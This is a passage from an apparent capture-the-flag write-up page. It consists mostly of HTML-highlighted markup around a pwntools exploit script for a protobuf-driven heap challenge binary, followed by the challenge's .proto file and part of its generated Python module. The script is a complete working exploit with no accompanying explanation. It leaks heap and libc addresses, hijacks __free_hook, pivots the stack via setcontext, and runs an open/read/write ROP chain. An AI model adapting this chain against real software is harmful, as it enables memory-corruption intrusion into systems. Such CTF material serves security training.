punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es <span class="token operator">=</span> <span class="token keyword">lambda</span> data           <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>lg1  <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;34m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>lg2  <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;37m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pn   <span class="token operator">=</span> <span class="token keyword">lambda</span> name          <span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\033[01;38;5;214mOCT:%d\nHEX:%s \033[0m"</span><span class="token operator">%</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span>    <span class="token comment">#------------------------------------------------------------------------------------------</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">import</span> x1nri_pb2context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">)</span><span class="token comment">#context.terminal=["tmux","splitw","-h"]</span>binary<span class="token operator">=</span><span class="token string">"./chat"</span><span class="token comment">#context.log_level="debug"</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token comment">#------------------------------------------------------------------</span>choose<span class="token operator">=</span><span class="token number">1</span><span class="token keyword">if</span> choose<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token comment">#ENV=&#123;"LD_PRELOAD":"/home/xinri/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so"&#125;</span><span class="token comment">#io=process(["/home/xinri/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so",name],env=ENV)</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">botmessage</span><span class="token punctuation">(</span>flag<span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">,</span> choice<span class="token punctuation">:</span><span class="token builtin">int</span><span class="token punctuation">,</span> idx<span class="token punctuation">:</span><span class="token builtin">int</span><span class="token punctuation">,</span> size<span class="token punctuation">:</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>msg<span class="token operator">=</span>x1nri_pb2<span class="token punctuation">.</span>msg<span class="token punctuation">(</span><span class="token punctuation">)</span>msg<span class="token punctuation">.</span>flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>msg<span class="token punctuation">.</span>choice<span class="token operator">=</span>choicemsg<span class="token punctuation">.</span>idx<span class="token operator">=</span>idxmsg<span class="token punctuation">.</span>size<span class="token operator">=</span>size<span class="token keyword">return</span> msg<span class="token punctuation">.</span>SerializeToString<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>sa<span class="token punctuation">(</span><span class="token string">'Please input your data: '</span><span class="token punctuation">,</span>botmessage<span class="token punctuation">(</span><span class="token string">'ADD'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> idx<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'Please input the content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>sa<span class="token punctuation">(</span><span class="token string">'Please input your data: '</span><span class="token punctuation">,</span>botmessage<span class="token punctuation">(</span><span class="token string">'DELETE'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> idx<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>sa<span class="token punctuation">(</span><span class="token string">'Please input your data: '</span><span class="token punctuation">,</span>botmessage<span class="token punctuation">(</span><span class="token string">'SHOW'</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> idx<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>sa<span class="token punctuation">(</span><span class="token string">'Please input your data: '</span><span class="token punctuation">,</span>botmessage<span class="token punctuation">(</span><span class="token string">'EDIT'</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> idx<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'Please input the content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#-----leak heap</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>leakheap<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>heap_base<span class="token operator">=</span>leakheap<span class="token operator">-</span><span class="token number">0x3e0</span>lg<span class="token punctuation">(</span><span class="token string">'heap_base'</span><span class="token punctuation">,</span>heap_base<span class="token punctuation">)</span><span class="token comment">#-------control size to leak libc</span>target<span class="token operator">=</span>heap_base<span class="token operator">+</span><span class="token number">0x2e0</span><span class="token comment">#0</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x421</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>uu64<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x1ecbe0</span>lg<span class="token punctuation">(</span><span class="token string">'libc_base'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>ls<span class="token punctuation">(</span><span class="token string">'__free_hook'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>lg<span class="token punctuation">(</span><span class="token string">'__free_hook'</span><span class="token punctuation">,</span>ls<span class="token punctuation">(</span><span class="token string">'__free_hook'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>getkeyserv_handle_576<span class="token operator">=</span><span class="token number">0x0000000000151990</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token comment">#---------getkeyserv_handle_576</span>add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>getkeyserv_handle_576<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#__free_hook</span>add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b'frame1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>lg<span class="token punctuation">(</span><span class="token string">'frame1chunk_mem'</span><span class="token punctuation">,</span>heap_base<span class="token operator">+</span><span class="token number">0x930</span><span class="token punctuation">)</span><span class="token comment">#setcontext</span>add<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b'frame2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>lg<span class="token punctuation">(</span><span class="token string">'frame2chunk_mem'</span><span class="token punctuation">,</span>heap_base<span class="token operator">+</span><span class="token number">0xa00</span><span class="token punctuation">)</span><span class="token comment">#frame</span>add<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b'rop'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>lg<span class="token punctuation">(</span><span class="token string">'ropchunk_mem'</span><span class="token punctuation">,</span>heap_base<span class="token operator">+</span><span class="token number">0xad0</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x930</span><span class="token operator">+</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#rdx</span>edit<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ls<span class="token punctuation">(</span><span class="token string">'setcontext'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">61</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0xad0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0000000000022679</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#frame=p64(0)+p64(heap_base+0xa00)+p64(0x000000000000101a+libc.address)#rcx,rsp,rip</span><span class="token comment">#edit(10,bytes(frame))</span>rdi<span class="token operator">=</span><span class="token number">0x0000000000023b6a</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addressrsi<span class="token operator">=</span><span class="token number">0x000000000002601f</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addressrdx<span class="token operator">=</span><span class="token number">0x0000000000142c92</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addressOPEN<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'open'</span><span class="token punctuation">)</span>READ<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'read'</span><span class="token punctuation">)</span>WRITE<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">)</span><span class="token comment">#---------pivot</span>pop_rsp_ret<span class="token operator">=</span><span class="token number">0x000000000002f70a</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addresspivot<span class="token operator">=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>rsi<span class="token punctuation">,</span>heap_base<span class="token operator">+</span><span class="token number">0x400</span><span class="token punctuation">,</span>rdx<span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span>READ<span class="token punctuation">]</span><span class="token punctuation">)</span>pivot<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>pop_rsp_ret<span class="token punctuation">,</span>heap_base<span class="token operator">+</span><span class="token number">0x400</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span>pivot<span class="token punctuation">)</span><span class="token comment">#dbg('')</span>delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token comment">#----------orw</span>flag_addr<span class="token operator">=</span>heap_base<span class="token operator">+</span><span class="token number">0x400</span><span class="token operator">+</span><span class="token number">7</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">*</span><span class="token number">8</span>target<span class="token operator">=</span>heap_base<span class="token operator">+</span><span class="token number">0x500</span>orw<span class="token operator">=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span>flag_addr<span class="token punctuation">,</span>rsi<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>rdx<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>OPEN<span class="token punctuation">]</span><span class="token punctuation">)</span>orw<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span>rsi<span class="token punctuation">,</span>target<span class="token punctuation">,</span>rdx<span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span>READ<span class="token punctuation">]</span><span class="token punctuation">)</span>orw<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>rsi<span class="token punctuation">,</span>target<span class="token punctuation">,</span>rdx<span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span>WRITE<span class="token punctuation">]</span><span class="token punctuation">)</span>orw<span class="token operator">+=</span><span class="token string">b'./flag\x00'</span>s<span class="token punctuation">(</span>orw<span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><p>x1nri.proto：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">syntax = "proto2"; package tutorial; message msg &#123;required string flag = 1;required int64 choice = 2;required int64 idx = 3;required int64 size = 4;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>x1nri_pb2.py：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># Generated by the protocol buffer compiler.  DO NOT EDIT!</span><span class="token comment"># source: x1nri.proto</span><span class="token keyword">from</span> google<span class="token punctuation">.</span>protobuf <span class="token keyword">import</span> descriptor <span class="token keyword">as</span> _descriptor<span class="token keyword">from</span> google<span class="token punctuation">.</span>protobuf <span class="token keyword">import</span> message <span class="token keyword">as</span> _message<span class="token keyword">from</span> google<span class="token punctuation">.</span>protobuf <span class="token keyword">import</span> reflection <span class="token keyword">as</span> _reflection<span class="token keyword">from</span> google<span class="token punctuation">.</span>protobuf <span class="token keyword">import</span> symbol_database <span class="token keyword">as</span> _symbol_database<span class="token comment"># @@protoc_insertion_point(imports)</span>_sym_db <span class="token operator">=</span> _symbol_database<span class="token punctuation">.</span>Default<span class="token punctuation">(</span><span class="token punctuation">)</span>DESCRIPTOR <span class="token operator">=</span> _descriptor<span class="token punctuation">.</span>FileDescriptor<span class="token punctuation">(</span>  name<span class="token operator">=</span><span class="token string">'x1nri.proto'</span><span class="token punctuation">,</span>  package<span class="token operator">=</span><span class="token string">'tutorial'</span><span class="token punctuation">,</span>  syntax<span class="token operator">=</span><span class="token string">'proto2'</span><span class="token punctuation">,</span>  serialized_options<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>  create_key<span class="token operator">=</span>_descriptor<span class="token punctuation">.</span>_internal_create_key<span class="token punctuation">,</span>  serialized_pb<span class="token operator">=</span><span class="token string">b'\n\x0bx1nri.proto\x12\x08tutorial\">\n\x03msg\x12\x0c\n\x04\x66lag\x18\x01 \x02(\t\x12\x0e\n\x06\x63hoice\x18\x02 \x02(\x03\x12\x0b\n\x03idx\x18\x03 \x02(\x03\x12\x0c\n\x04size\x18\x04 \x02(\x03'</span><span class="token punctuation">)</span>_MSG <span class="token operator">=</span> _descriptor<span class="token punctuation">.</span>Descriptor<span class="token punctuation">(</span>  name<span class="token operator">=</span><span class="token string">'msg'</span><span class="token punctuation">,</span>  full_name<span class="token operator">=</span><span class="token string">'tutorial.msg'</span><span class="token punctuation">,</span>  filename<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>  <span class="token builtin">file</span><span class="token operator">=</span>DESCRIPTOR<span class="token punctuation">,</span>  containing_type<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>  create_key<span class="token operator">=</span>_descriptor<span class="token punctuation">.</span>_internal_create_key<span class="token punctuation">,</span>  fields<span class="token operator">=</span><span class="token punctuation">[</span>    _descriptor<span class="token punctuation">.</span>FieldDescriptor<span class="token punctuation">(</span>      name<span class="token operator">=</span><span class="token string">'flag'</span><span class="token punctuation">,</span> full_name<span class="token operator">=</span><span class="token string">'tutorial.msg.flag'</span><span class="token punctuation">,</span> index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>      number<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token number">9</span><span class="token punctuation">,</span> cpp_type<span class="token operator">=</span><span class="token number">9</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>      has_default_value<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> default_value<span class="token operator">=</span><span class="token string">b""</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      message_type<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> enum_type<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> containing_type<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>      is_extension<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> extension_scope<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>      serialized_options<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>DESCRIPTOR<span class="token punctuation">,</span>  create_key<span class="token operator">=</span>_descriptor<span class="token punctuation">.</span>_internal_create_key<span class="token punctuation">)</span><span class="token punctuation">,</span>    _descriptor<span class="token punctuation">.</span>FieldDescriptor<span class="token punctuation">(</span>      name<span class="token operator">=</span><span class="token string">'choice'</span><span class="token punctuation">,</span> full_name<span class="token operator">=</span><span class="token string">'tutorial.msg.choice'</span><span class="token punctuation">,</span> index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>      number<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> cpp_type<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>      has_default_value<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> default_value<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>      message_type<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> enum_type<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> containing_type<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>      is_extension<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> extension_scope<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>      serialized_options<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>DESCRIPTOR<span class="token punctuation">,</span>  create_key<span class="token operator">=</span>_descriptor<span class="token punctuation">.</span>_internal_create_key<span class="token punctuation">)</span><span class="token punctuation">,</span>    _descriptor<span class="token punctuation">.</span>FieldDescriptor<span class="token punctuation">(</span>      name<span class="token operator">=</span><span class="token string">'idx'</span><span class="token punctuation">,</span> full_name<span class="token operator">=</span><span class="token string">'tutorial.msg.idx'</span><span class="token punctuation">,</span> index<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>      number<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> cpp_type<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>      has_default_value<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> default_value<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>      message_type<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> enum_type<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> containing_type<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>      is_extension<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> extension_scope<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>      serialized_options<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>DESCRIPTOR<span class="token punctuation">,</span>  create_key<span class="token operator">=</span>_descriptor<span class="token punctuation">.</span>_internal_create_key<span class="token punctuation">)</span><span class="token punctuation">,</span>    _descriptor<span class="token punctuation">.</span>FieldDescriptor<span class="token punctuation">(</span>      name<span class="token operator">=</span><span class="token string">'size'</span><span class="token punctuation">,</span> full_name<span class="token operator">=</span><span class="token string">'tutorial.msg.size'</span><span class="token punctuation">,</span> index<span 